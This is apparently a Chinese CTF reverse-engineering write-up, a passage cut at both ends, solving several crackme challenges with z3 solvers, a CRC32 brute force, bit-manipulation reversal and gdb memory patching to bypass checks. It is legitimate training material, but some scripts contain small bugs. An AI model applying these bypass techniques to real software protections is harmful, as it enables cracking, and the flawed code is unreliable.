(@Ga0<RxfmoNgJTtE-aLH\\rE5fMy7rk$)V\\rL2Fv/AivOa\"\\nuX|70Xrw^D]%i%JyT\\x0cc%cwZ/Wbp=IiY;/@nFEe>3=tM;K*`fReGoc5V/Ri?nXZ-RW)\\'\\t<\\x0cV>@X@-Ei4%sO%},B_pjc`s\"@oKCmdgDhjUZT@?mb\\'?Q:F\\x0bLJkPgjaFAc=rbrjAz$Zz\\x0cq0GU!\")xFOEF(x!3M\\t:l83|}}HgGJJ#eT/I\\x0b[|lK_n+;Wi/N^B4LzL.a(gVWq,zO6\\'S|tb>RX` ca*CO<w\\x0ci =wc1,M~\\x0bc`FYEs\\r){+Ll8[I9-88m\\t\\\\iK/\\\\hno-C[vX*3Hx:%:K\\rt\\x0cW!tj\\'SOhqxP|k7cw Hm?I@?P\\'HmapG7$0#T(Auz]sjmd#\\rFP/}53@-Kvmi(d%dZKLZ2LK\\'e_E\\x0bQmR 5/(irq4-EUyp<hB?[\\tnU:p*xuzASM'\nprint ('').join(gg[(lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda n: 1 if n < 3 else f(n - 1) + f(n - 2))(i + 2)] for i in range(16)) % ('').join(data[pow((__import__('fractions').gcd(z[(i % 5)], z[((i + 1) % 5)]) * 2 + 1) * g, F[(i % 5)] * (i * 2 + 1), len(data))] for i in range(32))\n# okay decompiling pyyy.pyc\n\n```\n\n分析代码，要求用户输入`c`，若`c != l`则输出wrong，其中`l`由分析可知是由程序自动生成与用户输入无关。将py文件`c = raw_input('Channenge #%d:' % i)`前添加`print l`,载入kali中运行。将得到的`l`用作输入`c`的值，得到flag。\n\n![uck7M8.png](https://s2.ax1x.com/2019/10/06/uck7M8.png)\n\n\n\n### accumulator\n\n![uckOaj.png](https://s2.ax1x.com/2019/10/06/uckOaj.png)\n\n定位到关键部分代码，但暂时不太清楚`SHA512()`函数中的参数是什么。拖入edb动态分析，在SHA512下断点，从寄存器参数可知，SHA512带入的函数参数为`输入的字符串`和其`长度`，并将加密后的结果存在&v6开始的地址下。\n\n进入`4008C0()`函数\n\n![uckXIs.png](https://s2.ax1x.com/2019/10/06/uckXIs.png)\n\n分析可知，此函数的作用是：将传入的字符串按字节进行累加，每加一次就与`dic`比较，若不相等则输出`Bad flag :(`并退出。所以依次相减可得出flag\n\n```python\ndic = [0x00c3, 0x00ff, 0x01ed, 0x0248, 0x031f, 0x03a1, 0x03b2, 0x043e, 0x049c, 0x04a0, 0x058d, 0x063b, 0x070d, 0x0736, 0x0821, 0x0910, 0x097e, 0x0a2d, 0x0aa7, 0x0b9c, 0x0c8d, 0x0d4b, 0x0d5a, 0x0e41, 0x0e80, 0x0f6e, 0x0f95, 0x1061, 0x1084, 0x112a, 0x11ab, 0x1210, 0x1262, 0x1347, 0x1387, 0x13d0, 0x13f2, 0x14ab, 0x1586, 0x15a0, 0x160c, 0x1677, 0x1769, 0x17e6, 0x17ee, 0x1836, 0x1843, 0x190a, 0x1945, 0x19d1, 0x19f7, 0x1a60, 0x1b42, 0x1b62, 0x1b8d, 0x1bc2, 0x1c6a, 0x1d2c, 0x1d8b, 0x1df9, 0x1e1a, 0x1f14, 0x1fd2, 0x1ffb, 0x2041, 0x208d, 0x20ce, 0x2115, 0x2190, 0x21c0, 0x21f5, 0x2226, 0x2259, 0x228c, 0x22c5, 0x22f9, 0x232f, 0x2366, 0x2399, 0x23c9, 0x23ff, 0x2465, 0x249e, 0x24d5, 0x250b, 0x2544, 0x2577, 0x25ac, 0x25dc, 0x260d, 0x2640, 0x2676, 0x26d8, 0x270c, 0x273d, 0x27a0, 0x27d3, 0x2806, 0x2836, 0x286e, 0x28a2, 0x28d2, 0x2937, 0x299c, 0x29fe, 0x2a61, 0x2ac2, 0x2b25, 0x2b58, 0x2b8b, 0x2bc2, 0x2c28, 0x2c59, 0x2cbb, 0x2cf3, 0x2d55, 0x2d85, 0x2de9, 0x2e4c, 0x2e7c, 0x2eaf, 0x2f14, 0x2f49, 0x2f81, 0x2fe3, 0x3048, 0x3079, 0x30ad, 0x3113, 0x3178, 0x31ae, 0x31e7, 0x3217, 0x3279, 0x32aa, 0x32dc, 0x330f, 0x3375, 0x33ab, 0x33dc, 0x343e, 0x346e, 0x34d1, 0x3501, 0x3563, 0x3596, 0x35cb, 0x3631, 0x3694, 0x36cd, 0x3700, 0x3763, 0x37c6, 0x3829, 0x3860, 0x3892, 0x38c3, 0x38f3, 0x3923, 0x3957, 0x398c, 0x39c5, 0x39f8, 0x3a2e, 0x3a67, 0x3acc, 0x3b32, 0x3b6a, 0x3b9f, 0x3bd2, 0x3c03, 0x3c64, 0x3c95, 0x3cfa, 0x3d32, 0x3d93, 0x3dca, 0x3e2c, 0x3e60, 0x3e92, 0x3ecb, 0x3f04, 0x3f69, 0x3fa0, 0x4002, 0x403b, 0x409f, 0x40d8, 0x410f, 0x413f, 0x41a1, 0x41da, 0x423b, 0x426d, 0x42a0, 0x4301, 0x4362, 0x43df]\nflag = \"\"\nfor i in range(1,len(dict)):\n    flag += chr(dic[i] - dic[i-1])\nprint(flag)\n```\n\n\n\n### GCCC\n\n.NET文件，用`dnSpy`打开反汇编得到java源码\n\n```java\nusing System;\n\n// Token: 0x02000002 RID: 2\npublic class GrayCCC\n{\n\t// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458\n\tpublic static void Main()\n\t{\n\t\tConsole.Write(\"Input the key: \");\n\t\tuint num;\n\t\tif (!uint.TryParse(Console.ReadLine().Trim(), out num))\n\t\t{\n\t\t\tConsole.WriteLine(\"Invalid key\");\n\t\t\treturn;\n\t\t}\n\t\tstring text = \"\";\n\t\tstring text2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ{} \";\n\t\tint num2 = 0;\n\t\tbyte[] array = new byte[]\n\t\t{\n\t\t\t164,\n\t\t\t25,\n\t\t\t4,\n\t\t\t130,\n\t\t\t126,\n\t\t\t158,\n\t\t\t91,\n\t\t\t199,\n\t\t\t173,\n\t\t\t252,\n\t\t\t239,\n\t\t\t143,\n\t\t\t150,\n\t\t\t251,\n\t\t\t126,\n\t\t\t39,\n\t\t\t104,\n\t\t\t104,\n\t\t\t146,\n\t\t\t208,\n\t\t\t249,\n\t\t\t9,\n\t\t\t219,\n\t\t\t208,\n\t\t\t101,\n\t\t\t182,\n\t\t\t62,\n\t\t\t92,\n\t\t\t6,\n\t\t\t27,\n\t\t\t5,\n\t\t\t46\n\t\t};\n\t\tbyte b = 0;\n\t\twhile (num != 0u)\n\t\t{\n\t\t\tchar c = (char)(array[num2] ^ (byte)num ^ b);\n\t\t\tif (!text2.Contains(new string(c, 1)))\n\t\t\t{\n\t\t\t\tConsole.WriteLine(\"Invalid key\");\n\t\t\t\treturn;\n\t\t\t}\n\t\t\ttext += c;\n\t\t\tb ^= array[num2++];\n\t\t\tnum >>= 1;\n\t\t}\n\t\tif (text.Substring(0, 5) != \"FLAG{\" || text.Substring(31, 1) != \"}\")\n\t\t{\n\t\t\tConsole.WriteLine(\"Invalid key\");\n\t\t\treturn;\n\t\t}\n\t\tConsole.WriteLine(\"Your flag is: \" + text);\n\t}\n}\n```\n\n关键代码`char c = (char)(array[num2] ^ (byte)num ^ b);`，使用python的z3模块可快速解方程\n\n```python\nfrom z3 import *\narray = [164,25,4,130,126,158,91,199,173,252,239,143,150,251,126,39,104,104,146,208,249,9,219,208,101,182,62,92,6,27,5,46]\nx = BitVec('x',64)\nsolver = Solver()\nsolver.add(x >= 2**31)\nsolver.add(x <= 2**32)\nb = 0\nflag = ''\nfor num in range(32):\n    if num < 5:\n        solver.add( (array[num]^(x&0x7f)^b)&0x7f == ord('FLAG{'[num]))\n    elif num < 31:\n        solver.add(\n            Or(\n                And(\n                    (array[num]^(x&0x7f)^b)&0x7f <= ord('Z'),\n                    (array[num]^(x&0x7f)^b)&0x7f >= ord('A')\n                    ),\n                (array[num]^(x&0x7f)^b)&0x7f == ord(' ')\n                )\n            )\n    if num == 31:\n        solver.add((array[num]^(x&0x7f)^b)&0x7f == ord('}'))\n    b = (b^array[num]) & 0x7f\n    x >>= 1\n\nif(solver.check() == sat):\n    print solver.model()\n```\n\n得到[x = 3658134498]\n\n程序一闪而过，od打不开程序，只好自己模拟一遍过程\n\n```python\narray = [164,25,4,130,126,158,91,199,173,252,239,143,150,251,126,39,104,104,146,208,249,9,219,208,101,182,62,92,6,27,5,46]\nx = 3658134498\nflag = ''\nb = 0\nfor num in range(32):\n    c = chr((array[num] ^ (x&0x7f) ^ b)&0x7f)\n    flag += c\n    b = (b^array[num])&0x7f\n    x >>= 1\n\nprint(flag)\n```\n\n\n\n### ccc\n\n![uckxGq.png](https://s2.ax1x.com/2019/10/06/uckxGq.png)\n\n\n\n![ucAPLF.png](https://s2.ax1x.com/2019/10/06/ucAPLF.png)\n\n取flag每三位递增，进行CRC校验取得CRC32值与hashes比较，可模拟CRC算法，暴力解出。\n\n![ucAeRx.png](https://s2.ax1x.com/2019/10/06/ucAeRx.png)\n\nCRC校验码生成步骤如下\n\n> crc校验，具体步骤如下：\n>\n> （1）将上次计算出的CRC校验码右移一个字节(i >>= 8)；\n> （2）将移出的这个字节与新的要校验的字节进行XOR 运算；(i ^ flag[i])\n> （3）用运算出的值在预先生成码表中进行索引，获取对应的值（称为余式）；j = crc32_tab[i ^ flag[i]]\n> （4）用获取的值与第（1）步右移后的值进行XOR 运算；i^j\n> （5）如果要校验的数据已经处理完，则第（4）步的结果就是最终的CRC校验码。如果还有数据要进行处理，则再转到第（1）步运行。\n\n```python\nimport string\n\ncrc32_tab = [0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, 0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, 0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d]\n\ndef crc32(num,a3):\n\ti = 0xffffffff\n\twhile True:\n\t\tv4 = a3\n\t\ta3 -= 1\n\t\tif (not v4):\n\t\t\treturn 0xffffffff - i\n\t\ta2 = num  & 0x7f\n\t\tnum = num >> 8\n\t\ti = (i >> 8) ^ (crc32_tab[(i ^ a2) & 0xff])\n\n\nhashes = [0xd641596f, 0x80a3e990, 0xc98d5c9b, 0x0d05afaf, 0x1372a12d, 0x5d5f117b, 0x4001fbfd, 0xa7d2d56b, 0x7d04fb7e, 0x2e42895e, 0x61c97eb3, 0x84ab43c3, 0x9fc129dd, 0xf4592f4d, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]\n\nflag = \"\"\ncount = 3\ncount_i = 0\nwhile count <= 42:\n\tfor i in string.printable:\n\t\tfor j in string.printable:\n\t\t\tfor l in string.printable:\n\t\t\t\ts = flag + i + j + l\n\t\t\t\t#print s,count,count_i\n\t\t\t\tif crc32( int(s[::-1].encode('hex'),16) , count ) == hashes[count_i]:\n\t\t\t\t\tflag = s\n\t\t\t\t\tcount += 3\n\t\t\t\t\tcount_i += 1\n\t\t\t\t\tprint(flag)\n\t\t\t\t\tbreak\n\t\nprint(flag)\n```\n\n\n\n### bitx\n\n![ucAmz6.png](https://s2.ax1x.com/2019/10/06/ucAmz6.png)\n\n将传入的flag按每字节与经过处理的data数据进行比较，逆向可求出flag\n\n![ucA6Wq.png](https://s2.ax1x.com/2019/10/06/ucA6Wq.png)\n\n```python\ndata = [0x8f, 0xaa, 0x85, 0xa0, 0x48, 0xac, 0x40, 0x95, 0xb6, 0x16, 0xbe, 0x40, 0xb4, 0x16, 0x97, 0xb1, 0xbe, 0xbc, 0x16, 0xb1, 0xbc, 0x16, 0x9d, 0x95, 0xbc, 0x41, 0x16, 0x36, 0x42, 0x95, 0x95, 0x16, 0x40, 0xb1, 0xbe, 0xb2, 0x16, 0x36, 0x42, 0x3d, 0x3d, 0x49]\n\nflag = \"\"\n\nfor i in range(len(data)):\n\ta = ((data[i] & 0xaa) >> 1)\n\tb = 2 * (data[i] & 0x55)\n\tflag += chr( ( a | b ) - 9 )\n\nprint(flag)\n```\n\n\n\n### 2018-rev\n\n直接运行\n\n![ucAgS0.png](https://s2.ax1x.com/2019/10/06/ucAgS0.png)\n\n提示C标准输入为以上要求，其中argc表示带入参数的个数，argv[0]指向输入的程序路径及名称，argv[1]指向参数para_1字符串，argv[1] [*]指向参数para_1字符串第 * 个字符，envp是系统的环境变量。\n\n可使用gdb，绕过判定条件。\n\n```shell\nset $r13d=2018\nset *((long *)0x7fffffffe48c)=1\nset *((long *)0x7fffffffe4a5)=1\n```\n\ncontinue后，又给出如下提示\n\n![ucAWOU.png](https://s2.ax1x.com/2019/10/06/ucAWOU.png)\n\n使用shell脚本更改时间\n\n```shell\nwhile true\ndo\n\tsudo date -us \"2018-01-01 00:00:00\"\ndone\n```\n\n再次使用以上绕过条件即可得出flag\n\n\n\n### what-the-hell\n\nelf文件，直接载入ida F5查看\n\n![ucA4w4.png](https://s2.ax1x.com/2019/10/06/ucA4w4.png)\n\n关键函数`calc_key3`和`decrypt_flag`\n\n`calc_key3`会对输入的两个数`v4`和`v5`进行验证，其验证方式可使用python中的`z3-solver`和`gmpy2`库进行求解\n\n`z3-solver`库安装命令 `pip install z3-solver`\n\n其中`what()`函数为`key`计算，通过1-9999998遍历，使用斐波那契递数列归计算出与输入第二个参数匹配的`i`，返回`key2 * i + 1`\n\n下面用python计算出通过验证的两个参数\n\n```python\nimport z3\nimport gmpy2\nimport math \n\nx = BitVec('x',32)\ny = BitVec('y',32)\n\nsolver = Solver()\n\nsolver.add(x * y == 0xDDC34132)\nsolver.add((x ^ 0x7e) * (y + 16) == 0x732092BE)\nsolver.add( ((x & 0xffff) - (y & 0xffff)) & 0xFFF == 3295)\n\nwhile solver.check() == sat : \n\ta = bytes(solver.model()[x])\n\tif gmpy2.is_prime(int(a)):\n\t\tprint(solver.model())\n\tsolver.add(Or(solver.model()[x] != x))\n```\n\n由于原程序递归耗时过长，用非递归方式模拟原程序计算出flag\n\n```python\nimport math\nimport time\n\njunk_data = [0x09, 0x23, 0x8c, 0xb9, 0x2f, 0x19, 0x8d, 0xf8, 0xf3, 0x79, 0x81, 0x87, 0x93, 0x99, 0x35, 0x52, 0x9c, 0xf0, 0x34, 0x99, 0x23, 0xb1, 0x84, 0x1d, 0xf0, 0x8f, 0x7e, 0x45, 0x0f, 0xcb, 0x40, 0xf8, 0x4e, 0xd1, 0x42, 0x29, 0x76, 0x17, 0x43, 0xe1, 0xac, 0x04, 0x37, 0xa0, 0xe4, 0x30, 0x59, 0xa9, 0x68, 0xd9, 0x1c, 0x96, 0xfc, 0x1d, 0x85, 0xea, 0xd2, 0x94, 0x07, 0x90, 0x09, 0xd2, 0xc9, 0x19, 0x86, 0xc9, 0xdc, 0x24, 0x6f, 0x3b, 0x5c, 0x92, 0x4c, 0x9f, 0xd9, 0x50, 0xdd, 0x98, 0x37, 0x1c, 0xb1, 0xda, 0xa5, 0x44, 0xf2, 0x8e, 0x43, 0x66, 0x91, 0xa3, 0xdf, 0xaf, 0x3a, 0x7e, 0x65, 0x91, 0x19, 0x22, 0xfd, 0xfe, 0x14, 0xba, 0x0a, 0xe1, 0xb9, 0x61, 0x73, 0x86, 0xe1, 0x96, 0xc1, 0x67, 0xce, 0x06, 0x25, 0x74, 0xf0, 0x2e, 0xa3, 0xbb, 0xed, 0x68, 0x3e, 0x53, 0x30, 0x43, 0x0e, 0x53, 0xb8, 0x8a, 0x9c, 0x95, 0x41, 0xc3, 0xb0, 0x25, 0x1c, 0xcb, 0x38, 0x86, 0xa6, 0x7a, 0x6f, 0xf2, 0x63, 0x0a, 0x19, 0x7c, 0x07, 0xda, 0x6f, 0xa2, 0x4e, 0xd2, 0x74, 0x4a, 0xf9, 0xaf, 0xc2, 0x9c, 0xfd, 0x89, 0xe6, 0x04, 0x11, 0xf6, 0x6f, 0xf5, 0x98, 0x55, 0x9d, 0x37, 0x12, 0xf2, 0xa6, 0x66, 0xbe, 0x85, 0x87, 0x8e, 0x87, 0x64, 0x5e, 0xa0, 0x61, 0x52, 0xd8, 0xbb, 0x39, 0x3d, 0x7b, 0xd2, 0x47, 0x27, 0x37, 0x30, 0xb5, 0xf8, 0x90, 0xfc, 0x50, 0xf3, 0xc1, 0x5c, 0x6b, 0xa4, 0xbe, 0x8d, 0xa5, 0xea, 0xdd, 0x72, 0xf2, 0x28, 0xe1, 0x74, 0xef, 0x07, 0x10, 0xcf, 0x39, 0x7d, 0x58, 0xe7, 0x46, 0x09, 0x04, 0xe9, 0xe9, 0x37, 0xd7, 0xe1, 0x20, 0xf9, 0xc2, 0x54, 0x28, 0xe7, 0x30, 0xe8, 0x86, 0x58, 0x77, 0x6c, 0x7d, 0x2e, 0x00, 0xce, 0xcc, 0x9c, 0xfb, 0xa3, 0x8d, 0xd1, 0x04, 0x98, 0x9d, 0x4f, 0xe8, 0x1f, 0x60, 0x3a, 0x8a, 0x5b, 0x1a, 0x11, 0x55, 0xf0, 0x6b, 0xcf, 0xd8, 0x6d, 0x75, 0x30, 0x9a, 0xd8, 0xd8, 0x5d, 0x2e, 0x90, 0x7e, 0x43, 0x5c, 0xeb, 0x3f, 0x26, 0x78, 0xaf, 0xb3, 0xb0, 0xc3, 0x1c, 0xe9, 0xab, 0x94, 0xe6, 0xc1, 0x49, 0x25, 0x4b, 0xaa, 0xff, 0x59, 0xe1, 0x11, 0x48, 0x3c, 0xb9, 0x16, 0x67, 0x27, 0xf9, 0xa0, 0x29, 0x68, 0x2e, 0xfb, 0x45, 0x5d, 0x29, 0x12, 0x0a, 0x36, 0x04, 0x54, 0xb3, 0xcf, 0x87, 0x24, 0x37, 0x8e, 0x7c, 0x5a, 0xef, 0xf8, 0x33, 0xe2, 0xe0, 0x89, 0x83, 0xa8, 0x4d, 0x72, 0x28, 0x80, 0xaa, 0xd4, 0x0e, 0xdd, 0x72, 0xa5, 0x0b, 0xad, 0x85, 0x6f, 0xee, 0x44, 0xad, 0x43, 0x7d, 0x30, 0xc2, 0x15, 0xc9, 0x72, 0x12, 0x53, 0x8a, 0x37, 0x9d, 0xf2, 0x64, 0x1d, 0x21, 0x5e, 0x49, 0x78, 0x54, 0xc0, 0xf0, 0xa9, 0x81, 0xe3, 0x32, 0xd4, 0x99, 0x81, 0x88, 0x64, 0xfe, 0x20, 0x92, 0x89, 0xd0, 0xc9, 0x5a, 0xce, 0xfa, 0xb5, 0xe4, 0x2a, 0x9d, 0x50, 0xab, 0x32, 0x35, 0x8d, 0x31, 0x4c, 0x94, 0x6c, 0xc0, 0xef, 0xf4, 0xe2, 0x40, 0xf7, 0x47, 0x51, 0xdb, 0x1c, 0x6d, 0x3b, 0x6b, 0xea, 0xda, 0x16, 0x9a, 0x27, 0x68, 0xa3, 0x73, 0xbf, 0x9d, 0x40, 0x8f, 0x07, 0xf3, 0xc7, 0x65, 0x57, 0xb7, 0x7e, 0x0c, 0xea, 0xc9, 0x9f, 0x7f, 0x46, 0x82, 0xe6, 0x5c, 0xe6, 0xdf, 0xfe, 0x42, 0x41, 0x12, 0x62, 0x33, 0x74, 0xff, 0xe9, 0x52, 0xd1, 0x0f, 0x75, 0x88, 0x43, 0x17, 0x02, 0x5a, 0x9e, 0x29, 0xad, 0x40, 0x62, 0xdb, 0x1f, 0x2c, 0xe7, 0xa8, 0x6e, 0xac, 0x62, 0xc4, 0xbe, 0xec, 0x98, 0xb3, 0xe9, 0x44, 0xd4, 0x3e, 0xc3, 0x9e, 0x0f, 0xbc, 0xad, 0xc6, 0x28, 0x28, 0x95, 0x93, 0xd1, 0xd5, 0x03, 0xaa, 0x78, 0xe3, 0x0d, 0x20, 0x90, 0x58, 0x82, 0xcc, 0x5f, 0x46, 0xf9, 0x2c, 0x17, 0x55, 0xdb, 0x96, 0x0a, 0x34, 0x69, 0x6b, 0x87, 0x2b, 0xb2, 0x45, 0x9d, 0x7c, 0xea, 0xf3, 0xab, 0x19, 0x6a, 0xe3, 0x73, 0x9d, 0x84, 0x6c, 0x3a, 0x04, 0xb5, 0x07, 0x3d, 0x10, 0x3e, 0x67, 0x5e, 0x53, 0x86, 0xdb, 0xa0, 0x39, 0xab, 0xe0, 0x06, 0x22, 0x27, 0x8c, 0x81, 0xd3, 0xc6, 0x1f, 0x15, 0x35, 0x8d, 0x26, 0x8d, 0x67, 0x03, 0xbd, 0xc3, 0x76, 0xf7, 0x27, 0x29, 0x82, 0xaf, 0x64, 0x9d, 0x15, 0x0f, 0xbe, 0xad, 0xab, 0x39, 0x50, 0xd7, 0xb9, 0x1b, 0x0a, 0x3f, 0x99, 0xcc, 0x6a, 0xf5, 0xff, 0x5b, 0xde, 0x9f, 0xd1, 0x4d, 0xfc, 0xf4, 0x21, 0x83, 0xd0, 0x33, 0xab, 0xa4, 0x3e, 0x3b, 0x3a, 0x67, 0x41, 0xde, 0x93, 0xb1, 0x2a, 0xc4, 0x98, 0xda, 0xea, 0x51, 0xfd, 0xcf, 0xeb, 0xf0, 0xc7, 0x1f, 0xf6, 0x4c, 0xfc, 0x04, 0xef, 0x24, 0x51, 0xbf, 0x0d, 0xb0, 0x50, 0x2c, 0x06, 0xaa, 0x0e, 0x2f, 0x74, 0xb0, 0xd5, 0x27, 0xe7, 0xd3, 0xc4, 0xa7, 0x57, 0x0d, 0x31, 0xce, 0xd2, 0x5f, 0x6f, 0x99, 0x43, 0xdb, 0x93, 0x59, 0x24, 0xc0, 0xa8, 0x29, 0x3f, 0xda, 0x70, 0xbd, 0x92, 0x8a, 0xc5, 0x76, 0xf9, 0x31, 0x8b, 0x98, 0xd6, 0x0a, 0x7c, 0xa0, 0x8d, 0x9b, 0x96, 0x4a, 0x77, 0x5b, 0xc2, 0xe5, 0x46, 0x72, 0x28, 0x4f, 0x54, 0x44, 0x06, 0xb4, 0xe5, 0xb2, 0x6c, 0xef, 0x4e, 0x1e, 0x7e, 0xae, 0x0a, 0xc0, 0x7d, 0x1e, 0x6e, 0x80, 0x3a, 0xdf, 0x88, 0x07, 0x4b, 0xf8, 0xce, 0x3a, 0x40, 0x60, 0x6f, 0xda, 0x9f, 0xe4, 0xd9, 0x58, 0xa3, 0x19, 0xec, 0x5a, 0xd8, 0x85, 0x52, 0x1e, 0xa8, 0xca, 0x04, 0xdc, 0x5d, 0xd2, 0x77, 0x45, 0x35, 0xb0, 0x5a, 0xd1, 0xcd, 0xdc, 0x30, 0xa6, 0x14, 0xa6, 0xa1, 0xbf, 0x24, 0xe1, 0xde, 0xe6, 0xef, 0xa9, 0x0e, 0x00, 0x64, 0x5d, 0xef, 0x11, 0x4a, 0xf3, 0x38, 0x52, 0x86, 0x81, 0x6f, 0x42, 0xfb, 0x8b, 0x4b, 0x36, 0xfb, 0x79, 0x9d, 0x82, 0xbc, 0x0d, 0x01, 0x14, 0x42, 0x86, 0xd7, 0x65, 0xb4, 0x51, 0xbf, 0xec, 0x64, 0xe4, 0x61, 0x21, 0x63, 0x99, 0xd3, 0xc5, 0xfe, 0x58, 0x0a, 0xf5, 0xa1, 0xd5, 0xb0, 0xd9, 0xb4, 0x8a, 0x02, 0xc7, 0x50, 0xde, 0xde, 0xf2, 0xbe, 0x13, 0xf8, 0x3f, 0x23, 0x51, 0x4c, 0x19, 0x40, 0x74, 0xa6, 0x35, 0xba, 0x4b, 0x71, 0x1b, 0xae, 0xfe, 0x43, 0x8f, 0xa4, 0x25, 0xa5, 0xe5, 0x31, 0xb3, 0x17, 0x00, 0x83, 0x34, 0x4a, 0xba, 0x05, 0xcf, 0xbb, 0xb8, 0x67, 0x25, 0xe0, 0xd3, 0x53, 0xfc, 0xaa, 0xba, 0xb3, 0x6c, 0x8a, 0xec, 0x8f, 0x9c, 0xdb, 0x47, 0x05, 0x8e, 0x5a, 0x3e, 0xd4, 0x7b, 0x5f, 0xc5, 0x42, 0xd1, 0x6c, 0x2c, 0x99, 0xba, 0xfd, 0x9d, 0x6b, 0x52, 0xd2, 0x34, 0x86, 0x6a, 0x5d, 0x5e, 0x50, 0xb3, 0x58, 0xd4, 0x3a, 0xb7, 0x12, 0x46, 0x0e, 0x40, 0x81, 0xa5, 0x21, 0x5d, 0x5e, 0x63, 0xe5, 0x3b, 0x30, 0x3b, 0x6e, 0x13, 0x73, 0x36, 0x20, 0x3c, 0xe3, 0xa9, 0x99, 0x70, 0x49, 0x92, 0xfc, 0xfa, 0x70, 0x24, 0x6f, 0x7b, 0x1d, 0x93, 0x8d, 0x7d, 0xb4, 0xae, 0x2a, 0x7d, 0x53, 0x5c, 0x68, 0xea, 0xfa, 0x94, 0x58, 0x54, 0x28, 0xcf, 0x23, 0xfb, 0x70, 0x80, 0x7f, 0xf0, 0x4f, 0x2a, 0x0b, 0x94, 0xd7, 0x3e, 0x7f, 0x78, 0x45, 0xfc, 0xe3, 0xa9, 0x3e, 0x1e, 0x23, 0xa3, 0x7e, 0x06, 0x00, 0x1d, 0x66, 0x50, 0x9d, 0xd1, 0x1f, 0x65, 0x7e, 0x76, 0x8f, 0x47, 0x73, 0xf0, 0xaa, 0x3a, 0xc5, 0xb8, 